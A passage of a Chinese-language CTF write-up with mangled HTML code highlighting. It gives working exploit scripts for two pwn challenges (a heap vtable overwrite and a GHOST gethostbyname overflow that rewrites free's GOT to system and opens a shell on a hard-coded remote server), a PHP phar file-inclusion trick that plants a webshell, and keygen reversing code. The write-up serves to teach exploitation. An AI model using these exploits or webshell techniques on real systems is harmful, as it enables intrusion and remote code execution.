     print hex<span class="list">(<span class="keyword">heap_addr</span>)</span>
     return malloc_addr, heap_addr
def exp<span class="list">(<span class="keyword">target</span>)</span>:
     io = zio<span class="list">(<span class="keyword">target</span>, timeout=10000, print_read=COLORED<span class="list">(<span class="keyword">RAW</span>, <span class="keyword">&amp;apos</span><span class="comment">;red&amp;apos;), print_write=COLORED(RAW, &amp;apos;green&amp;apos;))</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;aaa&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x602010</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;aaa&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x6020f0</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;aaa&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x6021d0</span>
     remove_entry<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;aaa&amp;apos;)</span>
     malloc_got = <span class="number">0</span>x0000000000601C58
     db_addr = <span class="number">0</span>x601dc0
     movie_vt = <span class="number">0</span>x00000000004015b0
     payload = l64<span class="list">(<span class="keyword">movie_vt</span>)</span> + <span class="keyword">&amp;apos</span><span class="comment">;a&amp;apos;*8 + &amp;apos;\x00&amp;apos;*56 + &amp;apos;b&amp;apos;*8 +&amp;apos;\x00&amp;apos;*(0x80-8) + l64(0x0000006443480000)+l64(malloc_got)</span>
     print len<span class="list">(<span class="keyword">payload</span>)</span>
     add_movie<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;ccc&amp;apos;, payload, 300, &amp;apos;eeee&amp;apos;) #0x602010 0x602110</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;hhh&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x6021e0</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;hhh&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x6022c0</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;hhh&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x6023a0</span>
     remove_entry<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;hhh&amp;apos;)</span>
     payload = l64<span class="list">(<span class="keyword">movie_vt</span>)</span> + <span class="keyword">&amp;apos</span><span class="comment">;a&amp;apos;*8 + &amp;apos;\x00&amp;apos;*56 + &amp;apos;b&amp;apos;*8 +&amp;apos;\x00&amp;apos;*(0x80-8) + l64(0x0000006443480000)+l64(db_addr)</span>
     add_movie<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;ccc&amp;apos;, payload, 300, &amp;apos;eeee&amp;apos;)</span>
     malloc_addr, heap_addr = show_all<span class="list">(<span class="keyword">io</span>)</span>
     io.gdb_hint<span class="list">()</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;jjj&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x6023b0</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;jjj&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x602490</span>
     add_tv<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;jjj&amp;apos;, 100, 200, &amp;apos;bbbb&amp;apos;) #0x602570</span>
     remove_entry<span class="list">(<span class="keyword">io</span>, <span class="keyword">&amp;apos</span><span class="comment">;jjj&amp;apos;)</span>
     #local
     #addr2 = malloc_addr - <span class="number">0</span>x00007FFFF7277750 + <span class="number">0</span>x00007FFFF723B52C
     #remote
     addr2 = malloc_addr - <span class="number">0</span>x0000000000082750 + <span class="number">0</span>x000000000004652c
     fake_vt = <span class="number">0</span>x6023b0+8 - <span class="number">0</span>x602010 + heap_addr
     payload = l64<span class="list">(<span class="keyword">fake_vt</span>)</span> + <span class="keyword">&amp;apos</span><span class="comment">;/bin/sh;&amp;apos; + &amp;apos;\x00&amp;apos;*56 + &amp;apos;b&amp;apos;*8 +&amp;apos;\x00&amp;apos;*(0x80-8) + l64(0x0000006443480000)+l64(db_addr)</span>
     print len<span class="list">(<span class="keyword">payload</span>)</span>
     add_movie<span class="list">(<span class="keyword">io</span>, l64<span class="list">(<span class="keyword">addr2</span>)</span>, payload, <span class="number">300</span>, <span class="keyword">&amp;apos</span><span class="comment">;eeee&amp;apos;)</span>
     io.writeline<span class="list">(<span class="keyword">&amp;apos</span><span class="comment">;4&amp;apos;)</span>
     io.interact<span class="list">()</span>
exp<span class="list">(<span class="keyword">target</span>)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>
</code></pre><h4 id="domain_db">domain_db</h4><h4 id="&#x6F0F;&#x6D1E;&#xFF1A;">&#x6F0F;&#x6D1E;&#xFF1A;</h4><p>&#x8BE5;&#x7A0B;&#x5E8F;&#x8C03;&#x7528;&#x4E86;gethostbyname&#xFF0C;&#x540C;&#x65F6;&#x63D0;&#x4F9B;&#x7684;libc&#x7684;&#x7248;&#x672C;&#x4E3A;2.15.&#xFF08;&#x901A;&#x8FC7;strings libc.so.6 | grep GLIBC&#x67E5;&#x770B;&#xFF09;&#xFF0C;&#x6240;&#x4EE5;&#x57FA;&#x672C;&#x786E;&#x5B9A;&#x662F;&#x53BB;&#x5E74;&#x7684;ghost&#x6F0F;&#x6D1E;&#x3002;</p>
<p>&#x56E0;&#x4E3A;&#x5F53;&#x65F6;&#x6F0F;&#x6D1E;&#x521A;&#x51FA;&#x6765;&#x65F6;&#xFF0C;&#x5927;&#x6982;&#x770B;&#x4E86;&#x4E00;&#x4E0B;&#x6F0F;&#x6D1E;&#xFF0C;&#x77E5;&#x9053;&#x6F0F;&#x6D1E;&#x4E3A;4&#x5B57;&#x8282;&#x6EA2;&#x51FA;&#x3002;&#x9700;&#x8981;&#x8FBE;&#x5230;&#x6EA2;&#x51FA;&#x9700;&#x8981;&#x6EE1;&#x8DB3;2&#x4E2A;&#x6761;&#x4EF6;&#xFF1A;</p>
<p>Gethostbyname&#x7684;name&#x53C2;&#x6570;&#x9700;&#x8981;&#x5927;&#x4E8E;0&#xD7;400&#xFF0C;&#x4E14;&#x5747;&#x4E3A;&#x6570;&#x5B57;&#x6216;&#x8005;.&#x53F7;&#x3002;</p>
<p>&#x901A;&#x8FC7;&#x5206;&#x6790;&#xFF0C;&#x53D1;&#x73B0;&#x8BE5;&#x6F0F;&#x6D1E;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x4E0B;&#x4E00;&#x4E2A;&#x5806;&#x7684;size&#x4F4D;&#x3002;</p>
<h4 id="&#x5229;&#x7528;&#x8FC7;&#x7A0B;&#x5927;&#x81F4;&#x5982;&#x4E0B;&#xFF1A;">&#x5229;&#x7528;&#x8FC7;&#x7A0B;&#x5927;&#x81F4;&#x5982;&#x4E0B;&#xFF1A;</h4><p>1.&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#x7533;&#x8BF7;&#x4E86;0-10&#x4E2A;domain&#x3002;</p>
<p>2.&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#x91CA;&#x653E;domain1</p>
<p>3.&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#x8C03;&#x7528;gethostbyname&#xFF0C;&#x6B64;&#x65F6;&#x4FDD;&#x8BC1;gethostbyname&#x4E2D;&#x7533;&#x8BF7;&#x7684;&#x5806;&#x521A;&#x597D;&#x5B8C;&#x5168;&#x5360;&#x7528;domain1&#x91CA;&#x653E;&#x51FA;&#x6765;&#x7684;&#x5806;&#x3002;&#x8FD9;&#x6837;&#x521A;&#x597D;&#x80FD;&#x8986;&#x76D6;domain2&#x7684;size&#x4F4D;&#xFF0C;&#x8986;&#x76D6;&#x4E3A;0&#xD7;3231&#xFF0C;&#x5373;&#x5BF9;&#x5E94;ascii&#x4E2D;&#x7684;21&#x3002;</p>
<p>4.&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#x91CA;&#x653E;domain2&#x3002; &#x6B64;&#x65F6;domain2&#x7684;size&#x88AB;&#x4FEE;&#x6539;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x91CA;&#x653E;&#x65F6;&#x5806;&#x7BA1;&#x7406;&#x5668;&#x4F1A;&#x5C06;domain3-10&#x7684;&#x533A;&#x57DF;&#x4E5F;&#x56DE;&#x6536;&#x4E86;&#x3002;&#x6B64;&#x6B65;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x8FC7;free check&#xFF0C;&#x6211;&#x8BA9;domain2_ptr + fake_size == av-&gt;top&#x3002;</p>
<p>5.&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#x4E4B;&#x540E;&#x518D;&#x6B21;&#x7533;&#x8BF7;&#x7A7A;&#x95F4;&#x65F6;&#xFF0C;&#x4F1A;&#x5C06;domain3-10&#x7684;&#x7A7A;&#x95F4;&#x4F1A;&#x88AB;&#x518D;&#x6B21;&#x5206;&#x914D;&#x3002;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4FEE;&#x6539;&#x5176;&#x4E2D;&#x67D0;&#x4E2A;domain&#x7684;name&#x6307;&#x9488;&#x4E3A;free_got&#x3002;</p>
<p>6.&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#x4E4B;&#x540E;&#x5229;&#x7528;&#x7A0B;&#x5E8F;&#x7684;show&#x548C;edit&#x529F;&#x80FD;&#x5BF9;free_got&#x8FDB;&#x884C;&#x8BFB;&#x53D6;&#x548C;&#x6539;&#x5199;&#x3002;</p>
<pre><code>&amp;<span class="comment">#x5229;&amp;#x7528;&amp;#x811A;&amp;#x672C;&amp;#x5982;&amp;#x4E0B;&amp;#xFF1A;</span>
<span class="keyword">from</span> zio <span class="keyword">import</span> *
target = (&amp;apos;<span class="number">119.254</span>.101.197&amp;apos;, <span class="number">10006</span>)
<span class="comment">#target = &amp;apos;./domain_db&amp;apos;</span>
<span class="function"><span class="keyword">def</span> <span class="title">add_domain</span><span class="params">(io, name)</span>:</span>
    io.read_until(&amp;apos;&amp;gt;&amp;apos;)
    io.writeline(&amp;apos;<span class="number">1</span>&amp;apos;)
    io.read_until(&amp;apos;:&amp;apos;)
    io.writeline(name)
<span class="function"><span class="keyword">def</span> <span class="title">lookup_domain</span><span class="params">(io, id)</span>:</span>
    io.read_until(&amp;apos;&amp;gt;&amp;apos;)
    io.writeline(&amp;apos;<span class="number">5</span>&amp;apos;)
    io.read_until(&amp;apos;:&amp;apos;)
    io.writeline(str(id))
<span class="function"><span class="keyword">def</span> <span class="title">edit_domain_name</span><span class="params">(io, id, new_name)</span>:</span>
    io.read_until(&amp;apos;&amp;gt;&amp;apos;)
    io.writeline(&amp;apos;<span class="number">2</span>&amp;apos;)
    io.read_until(&amp;apos;:&amp;apos;)
    io.writeline(str(id))
    io.read_until(&amp;apos;:&amp;apos;)
    io.writeline(new_name)
<span class="function"><span class="keyword">def</span> <span class="title">remove_domain</span><span class="params">(io, id)</span>:</span>
    io.read_until(&amp;apos;&amp;gt;&amp;apos;)
    io.writeline(&amp;apos;<span class="number">3</span>&amp;apos;)
    io.read_until(&amp;apos;:&amp;apos;)
    io.writeline(str(id))
<span class="function"><span class="keyword">def</span> <span class="title">list_domain</span><span class="params">(io)</span>:</span>
    io.read_until(&amp;apos;&amp;gt;&amp;apos;)
    io.writeline(&amp;apos;<span class="number">4</span>&amp;apos;)
    io.read_until(&amp;apos;&amp;lt;<span class="number">1</span>&amp;gt; &amp;apos;)
    free = l32(io.read(<span class="number">4</span>))
    <span class="keyword">print</span> hex(free)
    <span class="keyword">return</span> free
<span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(target)</span>:</span>
    io = zio(target, timeout=<span class="number">10000</span>, print_read=COLORED(RAW, &amp;apos;red&amp;apos;), print_write=COLORED(RAW, &amp;apos;green&amp;apos;))
    io.gdb_hint()
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos; * (<span class="number">0x800</span> - <span class="number">16</span> - <span class="number">8</span> - <span class="number">1</span> - <span class="number">4</span> - <span class="number">3</span>)+&amp;apos;<span class="number">12</span>&amp;apos;) <span class="comment">#0 0x804c008 0x804c7f0</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x770</span>) <span class="comment">#1 0x804c878 0x804cff0  top=0x804d070</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x1a0</span>) <span class="comment">#2</span>
    add_domain(io, &amp;apos;/bin/sh&amp;apos;+&amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x88</span>) <span class="comment">#3 0x0804d340 0x0804d2a8</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x10</span>) <span class="comment">#4 0x0804d3e0</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x5b0</span>) <span class="comment">#5</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x770</span>) <span class="comment">#6</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x770</span>) <span class="comment">#7</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x770</span>) <span class="comment">#8</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x770</span>) <span class="comment">#9</span>
add_domain(io, &amp;apos;/bin/sh;&amp;apos;+&amp;apos;<span class="number">0</span>&amp;apos;*(<span class="number">0x770</span>-<span class="number">8</span>)) <span class="comment">#10</span>
    remove_domain(io, <span class="number">1</span>)
lookup_domain(io, <span class="number">0</span>)
remove_domain(io, <span class="number">2</span>) <span class="comment"># top = 0x804d070 unsort=0x804d218</span>
    ptr_addr = <span class="number">0x0804b0a4</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x90</span>) <span class="comment">#1 0x0804d220</span>
    free_got = <span class="number">0x0804b004</span>
    payload2 = <span class="number">272</span>*&amp;apos;<span class="number">1</span>&amp;apos; + l32(free_got)
    add_domain(io, payload2)
    free = list_domain(io)
    <span class="comment">#local</span>
    system = <span class="number">0xb7e55060</span>
    <span class="comment">#remote</span>
    system = free - <span class="number">0x781b0</span> + <span class="number">0x3d170</span>
    edit_domain_name(io, <span class="number">1</span>, l32(system))
    remove_domain(io, <span class="number">10</span>)
    io.interact()
exp(target)
</code></pre><p>&#x6700;&#x597D;&#x7684;&#x8BED;&#x8A00;php</p>
<p>&#x9875;&#x9762;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x6CA1;&#x4EC0;&#x4E48;&#x4FE1;&#x606F;&#xFF0C;&#x53D1;&#x73B0;&#x4E86;index.php.bak&#x6587;&#x4EF6;&#xFF0C;</p>
<p><img src="http://img0.tuicool.com/MZJ32eb.jpg" alt=""></p>
<p>&#x5176;&#x4E2D;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x548C;sqli&#x8FC7;&#x6EE4;&#x90E8;&#x5206;&#x9690;&#x85CF;&#x4E86;&#xFF0C;&#x5C1D;&#x8BD5;&#x4E86;&#x4E00;&#x4E0B;&#x786E;&#x5B9E;&#x6CA1;&#x6709;sql&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#x3002;&#x770B;&#x4EE3;&#x7801;&#x7684;&#x903B;&#x8F91;&#x5E94;&#x8BE5;&#x662F;&#x5728;$id==1024&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x67E5;&#x8BE2;&#x51FA;flag&#x3002;&#x5229;&#x7528;php&#x4E0E;mysql&#x5BF9;&#x6D6E;&#x70B9;&#x6570;&#x636E;&#x5904;&#x7406;&#x7CBE;&#x5EA6;&#x4E0D;&#x540C;&#x3002;?id=1024.[&#x82E5;&#x5E72;0]1&#xFF0C;&#x5C1D;&#x8BD5;&#x51E0;&#x4E2A;&#x5373;&#x53EF;&#x5F97;&#x51FA;flag&#x3002;</p>
<h4 id="&#x4FF3;&#x53E5;&#x81EA;&#x52A8;&#x6253;&#x5206;&#x7CFB;&#x7EDF;">&#x4FF3;&#x53E5;&#x81EA;&#x52A8;&#x6253;&#x5206;&#x7CFB;&#x7EDF;</h4><p>&#x8FD9;&#x9053;&#x9898;&#x96BE;&#x5EA6;&#x6709;&#x4E24;&#x70B9;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x6F0F;&#x6D1E;&#x7684;&#x5229;&#x7528;&#xFF0C;page=php://filter/convert.base64-encode/resource=index,&#x53EF;&#x4EE5;&#x770B;&#x5230;index.php&#x6587;&#x4EF6;&#x6E90;&#x7801;base64&#x7F16;&#x7801;&#x4E4B;&#x540E;&#x7684;&#x4EE3;&#x7801;&#x3002;&#x5206;&#x6790;&#x4E4B;&#x540E;&#x53EF;&#x4EE5;&#x770B;&#x5230;xxtp&#x534F;&#x8BAE;&#x5DF2;&#x7ECF;&#x8FC7;&#x6EE4;&#xFF0C;&#x800C;&#x4E14;&#x6700;&#x540E;include&#x8BED;&#x53E5;&#x4F1A;&#x52A0;&#x4E0A;.php&#x540E;&#x7F00;&#x3002;phar&#x534F;&#x8BAE;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x51FA;&#x53EF;&#x5305;&#x542B;&#x7684;poc&#x3002;</p>
<p>&#x7F51;&#x4E0A;&#x641C;&#x7684;phar&#x6253;&#x5305;&#x7684;&#x4EE3;&#x7801;&#xFF1A;</p>
<pre><code>&amp;<span class="keyword">lt</span>;?php
try{
    <span class="variable">$p</span> = new Phar(dirname(__FILE_<span class="number">_</span>) . &amp;quot;<span class="keyword">my</span>.phar&amp;quot;, <span class="number">0</span>, &amp;apos;<span class="keyword">my</span>.phar&amp;apos;);
} catch (UnexpectedValueException <span class="variable">$e</span>) {
    <span class="keyword">die</span>(&amp;apos;Could <span class="keyword">not</span> <span class="keyword">open</span> <span class="keyword">my</span>.phar&amp;apos;);
} catch (BadMethodCallException <span class="variable">$e</span>) {
    echo &amp;apos;technically, this cannot happen&amp;apos;;
}
<span class="variable">$p</span>-&amp;<span class="keyword">gt</span>;startBuffering();
<span class="variable">$p</span>[&amp;apos;<span class="number">1</span>.php&amp;apos;] = file_get_contents(&amp;apos;shell.php&amp;apos;);
<span class="variable">$p</span>-&amp;<span class="keyword">gt</span>;setStub(&amp;quot;&amp;<span class="keyword">lt</span>;?php
    Phar::mapPhar(&amp;apos;myphar.phar&amp;apos;);
__HALT_COMPILER();&amp;quot;);
<span class="variable">$p</span>-&amp;<span class="keyword">gt</span>;stopBuffering();
?&amp;<span class="keyword">gt</span>;
</code></pre><p>&#x4E0A;&#x9762;&#x4EE3;&#x7801;&#x4F1A;&#x628A;shell.php&#x6253;&#x5305;&#x7684;phar&#x5305;&#x4E2D;&#x53BB;&#x3002;&#x56E0;&#x4E3A;&#x534F;&#x8BAE;&#x662F;&#x5BF9;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x5305;&#x542B;&#xFF0C;&#x5728;robots.txt&#x4E2D;&#x627E;&#x5230;txt&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x8DEF;&#x5F84;&#xFF0C;&#x4E14;&#x4F1A;&#x8FD4;&#x56DE;&#x6587;&#x4EF6;&#x540D;&#x3002;&#x5C06;phar&#x5305;&#x6539;.txt&#x6587;&#x4EF6;&#x540D;&#x4E0A;&#x4F20;&#xFF0C;&#x6784;&#x9020;poc&#xFF1A;</p>
<pre><code>?page=phar:<span class="comment">//upload_paiju/Eny2CRWfkt91Gf69.txt/1</span>
</code></pre><p>&#x8FD9;&#x6837;&#x5305;&#x542B;&#x4E4B;&#x540E;&#x7684;&#x8DEF;&#x5F84;&#x5C31;&#x662F;</p>
<pre><code><span class="function"><span class="title">Include</span><span class="params">(upload_paiju/Eny2CRWfkt91Gf69.txt/<span class="number">1</span>.php)</span></span>
</code></pre><p>&#x5176;&#x4E2D;Eny2CRWfkt91Gf69.txt/1.php&#x662F;&#x5BF9;phar&#x5305;&#x4E2D;1.php&#x6587;&#x4EF6;&#x7684;&#x8BBF;&#x95EE;&#x65B9;&#x5F0F;&#xFF08;&#x53EF;&#x4EE5;&#x67E5;&#x4E00;&#x4E0B;phar&#x7528;&#x6CD5;&#xFF09;&#x3002;</p>
<p>&#x83B7;&#x5F97;&#x4E86;webshell&#x3002;</p>
<p>&#x5728;&#x7B2C;&#x4E00;&#x5929;&#xFF0C;&#x6211;&#x7528;&#x7684;eval&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;&#xFF0C;eval&#x53EF;&#x7528;&#xFF0C;&#x4F46;&#x662F;&#x811A;&#x672C;&#x8FC7;&#x51E0;&#x79D2;&#x949F;&#x5C31;&#x4F1A;&#x88AB;&#x5220;&#x9664;&#x3002;&#x800C;&#x4E14;&#x6CA1;&#x6709;&#x627E;&#x5230;flag&#x6587;&#x4EF6;&#x3002;</p>
<p>&#x7B2C;&#x4E8C;&#x5929;&#x670D;&#x52A1;&#x91CD;&#x5F00;&#x4E4B;&#x540E;&#xFF0C;&#x53D1;&#x73B0;eval&#x6728;&#x9A6C;&#x7528;&#x4E0D;&#x4E86;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x8FC7;&#x6EE4;&#x6BD4;&#x8F83;&#x4E25;&#x683C;&#xFF0C;&#x53EF;&#x80FD;&#x88AB;&#x8FC7;&#x6EE4;&#x4E86;&#xFF0C;&#x5C31;&#x6362;&#x4E86;preg_replace&#x5199;&#x7684;&#x4E00;&#x53E5;&#x8BDD;&#xFF0C;&#x53EF;&#x7528;&#x3002;&#x690D;&#x5165;&#x4EE3;&#x7801;ini_get_all()&#x83B7;&#x5F97;&#x6240;&#x6709;&#x7684;php.ini&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x3002;&#x5176;&#x4E2D;&#x770B;&#x5230;&#x88AB;&#x5141;&#x8BB8;&#x7684;&#x8DEF;&#x5F84;&#x53EA;&#x6709;&#x7F51;&#x7AD9;&#x6839;&#x76EE;&#x5F55;&#x3001;tmp&#x3001;&#x548C;/srv&#xFF08;&#x8FD9;&#x662F;&#x4EC0;&#x4E48;&#x9B3C;&#xFF1F;&#xFF09;</p>
<p>Flag&#x5C31;&#x5728;/srv&#x4E0B;&#x8EBA;&#x7740;&#x4E86;&#x3002;</p>
<p>&#x8FD9;&#x79CD;&#x9898;&#x76EE;&#x6BD4;&#x8F83;&#x597D;&#x73A9;&#xFF0C;&#x4F30;&#x8BA1;&#x662F;&#x524D;&#x9762;&#x8FDB;&#x53BB;&#x7684;&#x4EBA;&#x5199;&#x4E86;php&#x811A;&#x672C;&#x8FC7;&#x51E0;&#x79D2;&#x5C31;&#x5220;&#x9664;&#x522B;&#x4EBA;&#x4E0A;&#x4F20;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x7B2C;&#x4E8C;&#x5929;&#x5C31;&#x4E0D;&#x5B58;&#x5728;&#x8FD9;&#x79CD;&#x95EE;&#x9898;&#x4E86;&#xFF0C;&#x9047;&#x5230;&#x7684;&#x95EE;&#x9898;&#x548C;&#x540E;&#x6765;&#x4E0A;&#x6765;&#x7684;&#x5F88;&#x5927;&#x4E0D;&#x540C;&#xFF0C;&#x574F;&#x4EBA;&#x589E;&#x591A;&#x4E86;&#x3002;</p>
<h4 id="Flager-checker">Flager-checker</h4><p>&#x770B;&#x4E0B;&#x6E90;&#x7801;&#xFF0C;&#x53EA;&#x8981;&#x6EE1;&#x8DB3;&#x8FD9;&#x4E00;&#x884C;&#x5C31;&#x53EF;&#x4EE5;&#xFF1A;</p>
<p><img src="http://img1.tuicool.com/bmAJZn3.jpg" alt=""></p>
<p>&#x540E;&#x9762;&#x7528;&amp;&amp;&#x9694;&#x5F00;&#x7684;&#x4E00;&#x5171;&#x6709;47&#x4E2A;&#x65B9;&#x7A0B;&#xFF0C;&#x7406;&#x8BBA;&#x4E0A;47&#x4E2A;&#x65B9;&#x7A0B;47&#x4E2A;&#x672A;&#x77E5;&#x91CF;&#x662F;&#x53EF;&#x89E3;&#x7684;&#xFF0C;&#x4ED4;&#x7EC6;&#x89C2;&#x5BDF;&#x4E00;&#x4E0B;&#xFF0C;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x5982;&#x679C;&#x5C06;&#x65B9;&#x7A0B;&#x6309;&#x7167;&#x957F;&#x5EA6;&#x6392;&#x5E8F;&#x7684;&#x8BDD;&#xFF0C;&#x4ECE;&#x4E0A;&#x81F3;&#x4E0B;&#x6BCF;&#x9694;&#x4E00;&#x884C;&#x5373;&#x53EF;&#x89E3;&#x51FA;&#x6765;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;&#x4ED6;&#x7684;&#x65B9;&#x7A0B;&#x6BCF;&#x591A;&#x4E00;&#x884C;&#x5C31;&#x53EA;&#x591A;&#x4E86;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#x800C;&#x5DF2;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;eval&#x5BF9;&#x65B0;&#x591A;&#x51FA;&#x6765;&#x7684;&#x53D8;&#x91CF;&#x8FDB;&#x884C;&#x7206;&#x7834;&#x4E86;&#xFF0C;&#x811A;&#x672C;&#xFF1A;</p>
<p><img src="http://img0.tuicool.com/NraYf2R.jpg" alt=""></p>
<h4 id="Keygen">Keygen</h4><p>&#x7A0B;&#x5E8F;&#x6709;&#x5F88;&#x591A;&#x79CD;&#x89E3;&#xFF0C;&#x901A;&#x8FC7;&#x5411;&#x670D;&#x52A1;&#x5668;&#x63D0;&#x4EA4;&#x4E00;&#x79CD;&#x89E3;&#x5C31;&#x53EF;&#x4EE5;&#x83B7;&#x5F97;flag&#xFF1A;</p>
<p><img src="http://img1.tuicool.com/ANnYFb.jpg" alt=""></p>
<p><img src="http://img2.tuicool.com/2ueuYn.jpg" alt=""></p>
<p>&#x6700;&#x4F18;&#x5148;&#x786E;&#x5B9A;&#x7684;&#x662F;4,9,14,19&#x4F4D;&#x7F6E;&#xFF0C;&#x7136;&#x540E;&#xFF0C;&#x5C06;&#x4E4B;&#x524D;&#x7684;&#x7A0B;&#x5E8F;&#x4E34;&#x6479;&#xFF0C;&#x901A;&#x8FC7;&#x5BF9;&#x90E8;&#x5206;&#x4F4D;&#x7F6E;&#x7684;&#x56FA;&#x5B9A;&#x8D4B;&#x503C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8BA1;&#x7B97;&#x51FA;&#x53E6;&#x5916;&#x4F4D;&#x7F6E;&#x7684;&#x5408;&#x9002;&#x7684;&#x6570;&#x503C;&#x3002;</p>
<pre><code><span class="label">__author__</span> = &amp;apos<span class="comment">;bibi&amp;apos;</span>
<span class="label">import</span> hashlib
<span class="label">a1</span>=&amp;quot<span class="comment">;0&amp;quot;*24</span>
<span class="label">def</span> run(<span class="literal">a1</span>):
    <span class="preprocessor">if</span> len(<span class="literal">a1</span>)!<span class="number">=24</span>:
        return <span class="number">0</span>
    v16= [
        <span class="literal">a1</span>[<span class="number">11</span>],
        <span class="literal">a1</span>[<span class="number">2</span>],
        <span class="literal">a1</span>[<span class="number">1</span>], <span class="number">#0</span>
        <span class="literal">a1</span>[<span class="number">13</span>],
        <span class="literal">a1</span>[<span class="number">16</span>], <span class="number">#0</span>
        <span class="literal">a1</span>[<span class="number">10</span>],
        <span class="literal">a1</span>[<span class="number">7</span>], <span class="number">#0</span>
        <span class="literal">a1</span>[<span class="number">17</span>],
    ]
    <span class="literal">v8</span> = [
        <span class="literal">a1</span>[<span class="number">15</span>], <span class="number">#0</span>
        <span class="literal">a1</span>[<span class="number">12</span>],
        <span class="literal">a1</span>[<span class="number">18</span>], <span class="number">#0</span>
        <span class="literal">a1</span>[<span class="number">0</span>],
        <span class="literal">a1</span>[<span class="number">6</span>], <span class="number">#0</span>
        <span class="literal">a1</span>[<span class="number">8</span>],
        <span class="literal">a1</span>[<span class="number">5</span>], <span class="number">#0</span>
        <span class="literal">a1</span>[<span class="number">3</span>],
    ]
    v16 += <span class="literal">v8</span>
    f = open(&amp;apos<span class="comment">;./sn_download&amp;apos;, &amp;apos;rb&amp;apos;)</span>
    d = f.read()[<span class="number">0x18e0</span>:]
    f.close()
    v24=[]
    <span class="label">#print</span> v16
    for j in range(<span class="number">16</span>):
        <span class="preprocessor">if</span> (ord(d[j]) - <span class="number">48</span> &amp;gt<span class="comment">; 9) | (ord(d[j]) &amp;lt; 48):</span>
            k = ord(d[j])
            v24.append(v16[k])
<span class="label">        else:</span>
            v24.append(d[j])
    <span class="label">#print</span> v24
    <span class="label">#print</span> &amp;apos<span class="comment">;&amp;apos;.join(c for c in v24)</span>
    temp=&amp;quot<span class="comment">;&amp;quot;.join(v24)</span>
    v25<span class="label">=hashlib</span>.md5(temp).digest()
    <span class="label">#print</span> v25
    <span class="label">#print</span> v25.encode(&amp;apos<span class="comment">;hex&amp;apos;)</span>
    v26=[]
